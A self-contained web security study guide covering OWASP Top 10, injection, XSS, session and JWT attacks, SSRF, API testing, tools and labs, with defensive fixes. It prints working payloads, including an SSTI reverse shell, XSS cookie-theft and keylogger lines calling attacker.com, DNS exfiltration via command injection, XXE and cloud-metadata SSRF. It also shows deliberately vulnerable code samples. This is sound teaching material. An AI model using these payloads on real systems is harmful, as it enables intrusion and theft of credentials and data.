# Phase 5 — Web Application Security
> Complete self-contained notes. No external resources needed.
> Estimated time: 1–2 months

---

## Table of Contents
1. [1. How the Web Actually Works (Brief)](#1-how-the-web-actually-works-brief)
2. [2. OWASP Top 10 (2021)](#2-owasp-top-10-2021)
3. [3. Injection Attacks](#3-injection-attacks)
4. [4. Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
5. [5. Authentication & Session Attacks](#5-authentication--session-attacks)
6. [6. Server-Side Request Forgery (SSRF)](#6-server-side-request-forgery-ssrf)
7. [7. API Security](#7-api-security)
8. [8. Tools of the Trade](#8-tools-of-the-trade)
9. [9. Practice & Labs](#9-practice--labs)
10. [10. Quick Reference Cheatsheet](#10-quick-reference-cheatsheet)

---

## 1. How the Web Actually Works (Brief)

Biggest mistake beginners make: they jump straight into SQLi without understanding the request-response cycle. You'll spot vulnerabilities way faster if you know what "normal" looks like.

### The Players

```
       Browser                           Server
          │                                │
          │  ─── GET /login HTTP/1.1 ───►  │
          │     Host: target.com           │
          │     Cookie: session=abc        │
          │                                │
          │  ◄── HTTP/1.1 200 OK ───────  │
          │     Content-Type: text/html    │
          │     Set-Cookie: session=xyz    │
          │     <html>...</html>           │
```

### What You Actually Need to Know

- **Request line** — method, path, HTTP version
- **Headers** — Host, Cookie, User-Agent, Referer, Authorization, Content-Type
- **Body** — POST data, JSON, XML
- **Response** — status code, headers, body

The entire field of web security is about finding ways to make the server (or other users) do things it shouldn't, because the request or response wasn't properly validated.

---

## 2. OWASP Top 10 (2021)

This is the industry-standard list of the most critical web app security risks. Updated every 3-4 years. If you learn nothing else, learn this.

### A01 — Broken Access Control

Most common category in the 2021 list. Users accessing things they shouldn't.

**IDOR (In-Direct Object Reference):**

```http
GET /api/users/1234/profile HTTP/1.1
Host: target.com
Cookie: session=abc
```

What happens when you change 1234 to 1235? If you see another user's data, that's IDOR.

```bash
# Check with curl
curl -b "session=abc" https://target.com/api/users/1235/profile
curl -b "session=abc" https://target.com/api/users/1236/profile
```

**Path Traversal:**

```http
GET /files?path=../../../etc/passwd HTTP/1.1
```

```bash
curl -b "session=abc" "https://target.com/files?path=../../../etc/passwd"
```

If you get the contents of /etc/passwd back, that's path traversal.

**How to test for it:**

- Change numeric IDs in URLs, POST bodies, or API calls
- Try HTTP method tampering (GET → PUT, DELETE)
- Modify JWT or session tokens to impersonate other users
- Check if admin endpoints are accessible without admin cookies

### A02 — Cryptographic Failures

Not just "encryption is hard" — it's about using the wrong thing or not using it at all.

**What to look for:**

```bash
# 1. HTTP instead of HTTPS (plaintext everything)
curl -sI http://target.com/login | grep -i "location.*https"

# 2. Weak TLS versions
nmap --script ssl-enum-ciphers -p 443 target.com

# 3. Passwords sent in plaintext
# Open Burp, intercept a login request, look for password= in the POST body

# 4. Sensitive data in URL parameters
# GET /reset?token=abc123 → token appears in server logs, referer headers

# 5. Weak password hashing
# If they stored the password in a cookie or returned it in JSON — game over
```

### A03 — Injection (covered in depth in section 3)

SQL, NoSQL, LDAP, OS command, template injection.

### A04 — Insecure Design

This one's about things that are fundamentally broken by design, not just buggy code.

**Examples:**

- No rate limiting on login (unlimited brute force)
- Password reset sends token via email in URL (leaked in logs + referer)
- No MFA requirement for admin actions
- "Forgot password" tells you if the email exists (user enumeration)
- No CSRF tokens on state-changing actions

**This is the hardest category to automate — you find these by thinking like an attacker, not running a scanner.**

### A05 — Security Misconfiguration

The most common thing you'll actually find in bug bounty programs.

```bash
# Default credentials
admin:admin
root:root
administrator:password

# Directory listing enabled
curl -s "https://target.com/images/" | grep -E "href=|src="

# Debug endpoints left exposed
curl -s "https://target.com/debug"
curl -s "https://target.com/.env"
curl -s "https://target.com/console"

# Verbose error messages
# Send invalid input and see if it dumps a stack trace with DB details

# Open cloud storage
# https://target.s3.amazonaws.com (403 = exists, 404 = doesn't)
```

### A06 — Vulnerable & Outdated Components

Using an old version of jQuery, a WordPress plugin from 2018, or a library with a known CVE.

```bash
# Check versions from response headers / HTML comments
curl -sI https://target.com | grep -i "server\|x-powered-by"

# Look for common paths that reveal version
curl -s https://target.com/wp-json/
curl -s https://target.com/CHANGELOG.txt
curl -s https://target.com/composer.json
curl -s https://target.com/package.json
```

**What matters:** If the target runs Apache 2.4.49 (released with a path traversal CVE), that's a critical finding.

### A07 — Identification & Authentication Failures

Weak login mechanisms, session handling, and credential management.

**Things to test:**

- Username enumeration (different error for "user exists" vs "wrong password")
- No rate limiting or account lockout
- Weak password policy (allows "password123")
- Session tokens in URL or not rotated after login
- No MFA on sensitive actions

### A08 — Software & Data Integrity Failures

Unsigned updates, insecure deserialization, and trusting data you shouldn't.

**Insecure Deserialization:**

```python
# Vulnerable PHP — takes user input and deserializes it directly
$data = unserialize($_GET['data']);
```

This lets attackers pass arbitrary objects and often leads to RCE. PHP deserialization is famous for this, but Java, Python (pickle), and .NET have similar issues.

### A09 — Security Logging & Monitoring Failures

If you don't log attacks, you can't detect them. If you log them but never check, same difference.

**What should be logged:**

- All authentication attempts (success + failure)
- Privileged operations (admin actions, role changes)
- Input validation failures (SQLi attempts, XSS payloads)
- Unexpected errors (stack traces)

**What shouldn't be logged:** passwords, credit card numbers, tokens.

### A10 — SSRF (covered in depth in section 6)

---

## 3. Injection Attacks

Injection is when untrusted data gets interpreted as code. The root cause is almost always the same: the developer concatenated user input into a command/query instead of using parameterized inputs.

### SQL Injection

This is the one everyone knows about, and it's still everywhere.

#### How It Works

```python
# Vulnerable code — NEVER DO THIS
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

If I enter `admin' --` as my username, the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the rest. I'm now logged in as admin with no password.

#### Types of SQLi

**In-band (Error-based):**

```sql
' OR 1=1 --
' UNION SELECT null,username,password FROM users --
```

**Blind (Boolean-based):**

```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a' --
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'b' --
```

If the page loads normally for 'a' but breaks for 'b', the first character of the admin password is 'a'. You're basically asking yes/no questions to extract the database character by character. Slow, but works when there's no visible output.

**Blind (Time-based):**

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

If the response takes 5 seconds, the condition is true. You can extract data the same way as boolean-based, just using time instead of page content.

**Out-of-band (DNS exfiltration):**

```sql
'; exec master..xp_dirtree '//attacker.com/abc' --
```

This triggers a DNS lookup to your server, effectively leaking data through DNS requests. Rare in modern web apps but powerful when it works.

#### Automated Exploitation

```bash
# sqlmap — the de facto standard
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" -D database --tables
sqlmap -u "https://target.com/page?id=1" -D database -T users --dump

# With POST data and cookie
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --cookie="session=abc"
```

**Don't become sqlmap-dependent.** Learn to do it manually first. Automated tools miss things that require thinking.

#### Defending Against SQLi

The fix is boring but effective:

```python
# Parameterized queries (Python/psycopg2 example)
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)

# ORM (Django, SQLAlchemy, etc.) handles this for you if you use it correctly
User.objects.filter(username=username, password=password)
```

**NEVER** concatenate user input into SQL strings. That's the entire fix.

### NoSQL Injection

MongoDB and other NoSQL databases are also injectable, just differently.

```javascript
// Vulnerable Express.js route
app.post('/login', (req, res) => {
    db.users.find({
        username: req.body.username,
        password: req.body.password
    })
})
```

If I send:

```json
{"username": "admin", "password": {"$ne": ""}}
```

The `$ne` operator means "not equal." So the query becomes "find a user where username=admin and password not equal to empty string" — which is almost certainly true.

```javascript
// Exploitation via $gt, $regex, $where
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
```

NoSQL injection is less common than SQLi but more likely to be missed by scanners.

### Command Injection

```python
# Vulnerable
ip = request.form['ip']
os.system(f"ping -c 1 {ip}")
```

If I enter `8.8.8.8; cat /etc/passwd`, the server runs both commands.

```bash
# Injection characters to try
;          # command separator
|          # pipe
&&         # AND
||         # OR
`command`  # command substitution
$(command) # also command substitution
\n         # newline (URL encoded as %0a)
```

**What to test:**

```bash
# Blind command injection (time-based)
8.8.8.8; sleep 5

# Out-of-band (DNS)
8.8.8.8; nslookup $(whoami).attacker.com

# Output capture
8.8.8.8 | whoami
```

### Server-Side Template Injection (SSTI)

Modern web frameworks use template engines (Jinja2, Twig, Pug, Handlebars). When user input is passed directly into the template, you can execute code.

```python
# Vulnerable Flask
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string(f"Hello {{name}}")
```

Jinja2 SSTI payload:

```python
# Test
{{7*7}}
# If the response shows "49", SSTI is confirmed

# Python code execution
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Reverse shell
{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')}}
```

**Recognition:** If the app reflects your input and uses curly braces or other template syntax, try `{{7*7}}` or `${7*7}`.

### XXE (XML External Entity)

When the app parses XML input and has DTD processing enabled.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

If the response contains /etc/passwd, XXE is confirmed.

```xml
# Blind XXE (out-of-band)
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil">
]>
<root>&xxe;</root>

# XXE to SSRF
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

---

## 4. Cross-Site Scripting (XSS)

XSS lets an attacker inject JavaScript into a page viewed by other users. It's not an attack on the server — it's an attack on the *other users* of the server.

### The Three Types

**Reflected XSS:**

User input is reflected in the response immediately but not stored.

```http
GET /search?q=<script>alert(1)</script> HTTP/1.1
```

The server responds with something like:

```html
<p>You searched for: <script>alert(1)</script></p>
```

The script only executes for the user who crafted the URL. Used in phishing — send a link to the victim, they click it, the script runs in their browser.

**Stored (Persistent) XSS:**

The payload is stored on the server and served to every user who visits the page.

```http
POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

comment=<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
```

Every user who loads the comments page sends their cookies to the attacker. This is the dangerous kind.

**DOM-based XSS:**

The vulnerability is entirely in the client-side JavaScript — the server never sees the payload.

```html
<script>
    const name = new URLSearchParams(window.location.search).get('name');
    document.getElementById('greeting').innerHTML = name;
</script>
```

```http
GET /page?name=<img src=x onerror=alert(1)> HTTP/1.1
```

No payload is sent to the server. The attack happens entirely in the DOM. Harder to detect with automated scanners.

### XSS Payload Examples

```html
<!-- Classic alert (proof of concept) -->
<script>alert(1)</script>

<!-- Cookie theft -->
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){new Image().src='https://attacker.com/k?c='+e.key}</script>

<!-- Page defacement -->
<body onload=document.body.innerHTML='<h1>pwned</h1>'>

<!-- No script tags (bypass filters) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href="javascript:alert(1)">click</a>
<input onfocus=alert(1) autofocus>

<!-- Bypass HTML entity encoding -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Polyglot (works in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//
```

### Content Security Policy (CSP)

CSP is an HTTP header that tells the browser what sources of content are allowed. It's the main defense against XSS.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**What CSP directives mean:**

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all resource types |
| `script-src` | Which scripts can execute |
| `style-src` | Which styles can be applied |
| `img-src` | Which images can load |
| `connect-src` | Which URLs can be fetched via JS |
| `frame-ancestors` | Who can embed the page in an iframe |

**Common CSP bypasses:**

```html
<!-- If 'unsafe-inline' is set, any inline script works -->
<!-- If a CDN is whitelisted, find a script on that CDN that executes user input -->
<!-- JSONP endpoints on whitelisted origins can execute arbitrary callbacks -->
```

### Defending Against XSS

The fix is context-dependent but follows the same principle:

```python
# Contextual output encoding

# HTML body context — HTML entity encode
<h1>{{ user_input|e }}</h1>

# HTML attribute context — attribute encode
<input value="{{ user_input|e }}">

# JavaScript context — JS string encode
<script>var name = "{{ user_input|escapejs }}";</script>

# URL context — URL encode
<a href="/page?q={{ user_input|urlencode }}">
```

Modern frameworks (React, Vue, Angular) handle most of this automatically by default — but only if you use them correctly. `dangerouslySetInnerHTML` in React or `v-html` in Vue bypasses all protections.

---

## 5. Authentication & Session Attacks

### Session Hijacking

If an attacker steals your session cookie, they become you. No password needed.

```bash
# In Burp: intercept a request, copy the cookie, paste into another browser
# If the second browser shows the account — session hijacking works

# Common cookie theft vectors:
# - XSS to steal document.cookie
# - Network sniffing (if no HTTPS)
# - Session token in URL (leaked via Referer)
```

**Protection:** `Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax`

The `HttpOnly` flag prevents JavaScript from reading the cookie (blocks XSS-based theft).

### CSRF (Cross-Site Request Forgery)

The user is logged into target.com. Attacker tricks them into visiting attacker.com, which submits a form to target.com using the user's cookies.

```html
<!-- Hosted on attacker.com -->
<img src="https://target.com/transfer?to=attacker&amount=1000" style="display:none">
```

When the victim loads this page, their browser sends a GET to target.com with their cookies. If target.com allows state changes via GET and doesn't check a CSRF token, the transfer goes through.

**Protection:**

```html
<!-- CSRF token — a random value tied to the session, included in every form -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="abc123...">
    <input type="text" name="amount">
</form>
```

```http
# SameSite cookie attribute — browser won't send cookie on cross-site requests
Set-Cookie: session=abc; SameSite=Strict
```

### JWT Attacks

JSON Web Tokens are everywhere in modern APIs. They're a way to encode user data in a signed/encrypted token.

Structure:

```
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature_here
```

**Common JWT vulnerabilities:**

```bash
# 1. "None" algorithm attack — change alg to "none" and strip signature
# Original: {"alg":"HS256"}
# Modified: {"alg":"none"}
# Server accepts unsigned tokens if misconfigured

# 2. Algorithm confusion — if server expects RS256 (asymmetric), 
#    change to HS256 (symmetric) using the public key as the secret
# The public key is... public. You can download it from /.well-known/jwks.json

# 3. Weak secret — crack the HS256 secret
hashcat -m 16500 jwt.txt rockyou.txt

# 4. Modify claims — change user, role, or exp
# {"user":"admin","role":"admin","exp":9999999999}
```

```bash
# Tools
# jwt_tool
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature -T

# jwt.io — paste and decode/debug
```

### OAuth Misconfigurations

OAuth lets users log in via Google, GitHub, etc.

**Common bugs:**

- **Open redirect** — the `redirect_uri` parameter isn't validated, attacker sends victim to their own site
- **Token leakage** — authorization code or token passed in URL fragment, leaks via Referer
- **CSRF on OAuth flow** — no `state` parameter, attacker can bind their account to your session
- **Improper scope validation** — requesting `repo` scope but the app only needs `read:user`

### Brute Force & Credential Stuffing

```bash
# Hydra — brute force web login
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# ffuf — fuzz usernames first, then passwords
ffuf -w usernames.txt -X POST -d "user=FUZZ&pass=test" -H "Content-Type: application/x-www-form-urlencoded" -fc 200 https://target.com/login

# Rate limiting bypasses:
# - X-Forwarded-For: 127.0.0.1 (IP spoofing)
# - Slow brute force (1 request per minute)
# - Distributed brute force (multiple IPs)
```

---

## 6. Server-Side Request Forgery (SSRF)

SSRF happens when an attacker can make the server send requests to internal resources.

### Basic Example

```http
GET /fetch?url=https://example.com HTTP/1.1
```

Change the url parameter to something internal:

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

`169.254.169.254` is the AWS metadata endpoint — it returns temporary credentials, security group info, and more. This single attack has compromised more cloud accounts than probably anything else.

### What to Try

```bash
# Internal IP ranges
http://127.0.0.1:8080
http://localhost:22
http://10.0.0.1:3306
http://172.16.0.1:6379
http://192.168.1.1:443

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/      # AWS
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
http://metadata.google.internal/               # GCP
http://100.100.100.200/latest/meta-data/       # Alibaba

# File protocol
file:///etc/passwd
file:///proc/self/environ

# Blind SSRF (trigger callback to detect)
http://attacker.burpcollaborator.net

# Redirect-based SSRF
# Find an open redirect on the target domain and chain it
# target.com/redirect?url=http://169.254.169.254/
```

**Why SSRF is dangerous:** It bypasses firewalls. The request comes from the server itself, which has access to internal services that are never meant to be exposed.

---

## 7. API Security

Modern web apps are often just frontend + API. The API is where the real data lives.

### REST API Testing

```bash
# 1. Enumerate endpoints — common paths
/api/users
/api/v1/users
/graphql
/swagger.json
/api-docs
/openapi.json

# 2. Test methods — GET to read, POST to create, PUT/PATCH to modify, DELETE to remove
curl -X GET https://api.target.com/users
curl -X DELETE https://api.target.com/users/1

# 3. Check auth — what happens if you remove the auth header?
curl -H "Authorization: " https://api.target.com/admin/users

# 4. Parameter pollution — duplicate parameters
curl "https://api.target.com/users?id=1&id=2"

# 5. Mass assignment — extra fields in request body
curl -X POST https://api.target.com/users -d '{"name":"test","role":"admin"}'
```

### GraphQL

GraphQL lets the client specify exactly what data they want. This is powerful and dangerous.

```graphql
# Introspection — dumps the entire schema (often left enabled)
query {
    __schema {
        types {
            name
            fields {
                name
                type {
                    name
                }
            }
        }
    }
}

# Batching attack — request multiple operations at once
[
    {"query": "mutation { resetPassword(token: \"a\", password: \"new1\") }"},
    {"query": "mutation { resetPassword(token: \"b\", password: \"new2\") }"},
    {"query": "mutation { resetPassword(token: \"c\", password: \"new3\") }"},
    # ... all possible password reset tokens in parallel
]

# Deep query — cause DoS via recursive relationship
query {
    user(id: 1) {
        posts {
            author {
                posts {
                    author {
                        posts { title }
                    }
                }
            }
        }
    }
}
```

### BOLA / BFLA

**Broken Object Level Authorization (BOLA)** — accessing objects you shouldn't (like IDOR for APIs).

**Broken Function Level Authorization (BFLA)** — accessing functions you shouldn't (regular user calls admin endpoints).

```bash
# Test BOLA
# Create a resource as user A, try to access it as user B
curl -H "Authorization: Bearer user_a_token" https://api.target.com/items/123

# Test BFLA
# Regular user tries admin-only operations
curl -H "Authorization: Bearer user_token" -X DELETE https://api.target.com/users/5
```

---

## 8. Tools of the Trade

### Burp Suite

The de facto standard web proxy. Free community edition is enough for learning.

**Workflow:**

1. Configure browser to proxy through Burp (127.0.0.1:8080)
2. Browse the target application normally
3. Review captured requests in Proxy → HTTP History
4. Send interesting requests to Repeater (manual testing)
5. Use Intruder for brute force / fuzzing (Community = rate limited)
6. Check scanner findings (Professional only)

**Essential Burp extensions (free):**

- **Logger++** — better logging
- **Autorize** — test for authorization issues automatically
- **Turbo Intruder** — faster brute forcing
- **JSON Web Tokens** — JWT decode/edit

### OWASP ZAP

Free alternative to Burp. Good enough for most work.

```bash
# Automated scan
zap.sh -quickurl https://target.com -quickout report.html
```

### SQLmap

```bash
sqlmap -u "https://target.com/page?id=1" --batch --risk=3 --level=5
```

### ffuf — Web Fuzzer

Fast as hell. Written in Go.

```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/directory-list-2.3-medium.txt -u https://target.com/FUZZ

# Subdomain fuzzing
ffuf -w subdomains.txt -u https://FUZZ.target.com -H "Host: FUZZ.target.com"

# Parameter fuzzing
ffuf -w params.txt -u 'https://target.com/api/users?FUZZ=1'

# POST body fuzzing
ffuf -w values.txt -X POST -d '{"user":"admin","pass":"FUZZ"}' -H "Content-Type: application/json" -fc 401 https://target.com/login
```

### Nikto — Web Server Scanner

```bash
nikto -h https://target.com
```

Noisy and old, but sometimes finds things other tools miss (outdated server software, default files).

---

## 9. Practice & Labs

Theoretical knowledge is useless without practice. You need to actually exploit these vulnerabilities to understand them.

| Resource | URL | What it's good for |
|----------|-----|-------------------|
| PortSwigger Web Security Academy | https://portswigger.net/web-security | Best free resource. Labs for every category. |
| DVWA (Damn Vulnerable Web App) | https://dvwa.co.uk | Run locally. Good for SQLi, XSS, file upload. |
| HackTheBox (Web category) | https://hackthebox.com | Real-world-ish machines. Some web-specific. |
| TryHackMe (Web sections) | https://tryhackme.com | Guided learning paths. |
| PentesterLab | https://pentesterlab.com | Paid but excellent for web-specific training. |
| Bugcrowd University | https://www.bugcrowd.com/hackers/bugcrowd-university | Free web security training with a bounty focus. |

### Recommended Lab Order

1. PortSwigger SQLi labs (start with basic UNION attacks)
2. PortSwigger XSS labs (reflected → stored → DOM)
3. PortSwigger CSRF labs
4. PortSwigger SSRF labs
5. PortSwigger API testing labs
6. DVWA (all categories, low → medium → high security)
7. HTB/TryHackMe web machines

---

## 10. Quick Reference Cheatsheet

### SQLi

```sql
-- Test for injection
' OR 1=1 --
' UNION SELECT null, null --
' AND SLEEP(5) --

-- MySQL comments
-- #
-- /* */

-- Extract data
' UNION SELECT group_concat(table_name),null FROM information_schema.tables --
' UNION SELECT group_concat(column_name),null FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username,password FROM users --
```

### XSS

```html
<!-- Test -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Steal cookie -->
<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
```

### Common Endpoints

```
/admin
/login
/register
/api
/v1
/.env
/.git/config
/robots.txt
/sitemap.xml
/swagger.json
/api-docs
```

### HTTP Methods to Try

```
GET → read
POST → create
PUT → replace
PATCH → update
DELETE → remove
OPTIONS → check allowed methods
```

### Headers to Check

```http
# Security headers (should be present)
Content-Security-Policy
Strict-Transport-Security
X-Frame-Options
X-Content-Type-Options
X-XSS-Protection
```

---

*Last updated: June 2026*
